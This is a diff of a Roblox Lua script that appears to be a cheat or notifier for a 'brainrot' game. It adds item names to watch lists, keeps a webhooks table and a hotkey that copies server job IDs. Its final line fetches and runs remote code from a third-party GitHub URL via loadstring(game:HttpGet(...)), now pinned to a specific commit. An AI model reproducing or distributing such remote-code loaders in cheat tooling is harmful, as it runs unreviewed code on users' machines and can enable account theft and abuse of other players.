@@ -57,11 +57,12 @@ local WEBHOOKS = {
 
 -- 📋 SPECIAL BRAINROTS WITH MIN VALUES
 local SPECIAL_BRAINROTS = {
-    ['Meowl'] = 0,
     ['Dragon Cannelloni'] = 0,
     ['Strawberry Elephant'] = 0,
-    ['Dragon Gingerini'] = 0,
+    ['Meowl'] = 0,
     ['Headless Horseman'] = 0,
+    ['Gingerbread Dragon'] = 0,
+    ['Dragon Gingerini'] = 0,
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -194,6 +195,9 @@ local OBJECTS = {
     ['Los 25'] = { emoji = '💀', important = true },
     ['25'] = { emoji = '💄', important = true },
     ['Dragon Gingerini'] = { emoji = '🐍', important = true },
+    ['Donkeyturbo Express'] = { emoji = '🍩', important = true },
+    ['Festive 67'] = { emoji = '6️⃣', important = true },
+    ['Money Money Reindeer'] = { emoji = '💶', important = true },
 }
 
 local ALWAYS_IMPORTANT = {}
@@ -657,4 +661,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CapibaroLimonchel/FFISH/refs/heads/main/BotRunerFREE.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CapibaroLimonchel/FFISH/90f2795a496ea24abebddecd3f8dc201b8331d90/BotRunerFREE.lua"))()
